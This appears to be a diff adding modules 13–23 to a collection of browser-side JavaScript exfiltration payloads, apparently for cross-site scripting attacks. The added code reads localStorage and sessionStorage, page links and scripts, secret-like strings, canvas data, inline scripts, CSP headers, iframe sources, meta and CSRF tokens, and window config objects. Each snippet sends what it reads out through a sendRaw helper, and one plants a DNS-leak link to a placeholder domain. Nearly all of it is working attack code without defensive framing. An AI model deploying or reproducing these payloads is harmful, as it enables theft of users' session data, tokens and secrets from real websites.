@@ -122,4 +122,125 @@
 
 })();
 //
-//
+////
+////
+
+### 🔧 Additional Payload Modules
+
+#### 13. 🧪 `localStorage` / `sessionStorage` Exfil
+
+```javascript
+try {
+  const allStorage = Object.entries(localStorage).map(([k,v]) => `${k}=${v}`).join('; ') +
+                     " | " +
+                     Object.entries(sessionStorage).map(([k,v]) => `${k}=${v}`).join('; ');
+  sendRaw("storage: " + allStorage, "/storage");
+} catch (_) {}
+```
+
+#### 14. 🧭 Link Crawler
+
+```javascript
+try {
+  const links = [...document.links].map(l => l.href).join('\n');
+  sendRaw("links: " + links.slice(0, 1024), "/links");
+} catch (_) {}
+```
+
+#### 15. 🧠 Script Tag Collection
+
+```javascript
+try {
+  const scripts = [...document.scripts].map(s => s.src || '[inline]').join('\n');
+  sendRaw("scripts: " + scripts.slice(0, 1024), "/scripts");
+} catch (_) {}
+```
+
+#### 16. 🔑 Look for Common Tokens/Secrets
+
+```javascript
+try {
+  const body = document.body.innerText;
+  const matches = body.match(/(api[_-]?key|token|secret)[^\s"']{0,40}/gi);
+  if (matches && matches.length) {
+    sendRaw("potential secrets: " + matches.join(', '), "/secrets");
+  }
+} catch (_) {}
+```
+
+#### 17. 🖼️ Screenshot Candidate: `<canvas>` Extraction
+
+```javascript
+try {
+  const canvas = document.querySelector("canvas");
+  if (canvas) {
+    const data = canvas.toDataURL("image/png");
+    sendRaw("canvas snapshot: " + data.slice(0, 256), "/canvas");
+  }
+} catch (_) {}
+```
+
+#### 18. 📡 DNS Leak via `<a>` element
+
+```javascript
+try {
+  const a = document.createElement("a");
+  a.href = "http://leak.YOURDOMAIN.test";
+  document.body.appendChild(a);
+} catch (_) {}
+```
+
+#### 19. 🧬 CSP Bypass Attempt (XHR to inline)
+
+```javascript
+try {
+  const src = document.querySelector("script:not([src])")?.textContent || "";
+  sendRaw("inline script: " + src.slice(0, 512), "/inlinejs");
+} catch (_) {}
+```
+
+#### 20. 🛑 CSP Header Detection
+
+```javascript
+try {
+  fetch("/", { method: "HEAD" }).then(r => {
+    const csp = r.headers.get("Content-Security-Policy");
+    if (csp) sendRaw("CSP header: " + csp, "/csp");
+  });
+} catch (_) {}
+```
+
+#### 21. 🧾 Exfil iframes’ `src` values
+
+```javascript
+try {
+  const iframes = [...document.querySelectorAll("iframe")].map(i => i.src).join(', ');
+  sendRaw("iframes: " + iframes, "/iframes");
+} catch (_) {}
+```
+
+#### 22. 🧩 DOM Token Dump (meta + csrf)
+
+```javascript
+try {
+  const metas = [...document.querySelectorAll("meta")].map(m => `${m.name || m.property || m.httpEquiv}=${m.content}`).join('; ');
+  sendRaw("meta tokens: " + metas, "/meta-tokens");
+} catch (_) {}
+```
+
+#### 23. 📦 Exfil Config JS Objects from Page
+
+```javascript
+try {
+  for (let k in window) {
+    if (/config|settings|options/i.test(k) && typeof window[k] === "object") {
+      const payload = JSON.stringify(window[k]);
+      if (payload.length > 20 && payload.length < 2048) {
+        sendRaw("window." + k + ": " + payload.slice(0, 1024), "/config-obj");
+        break;
+      }
+    }
+  }
+} catch (_) {}
+```
+
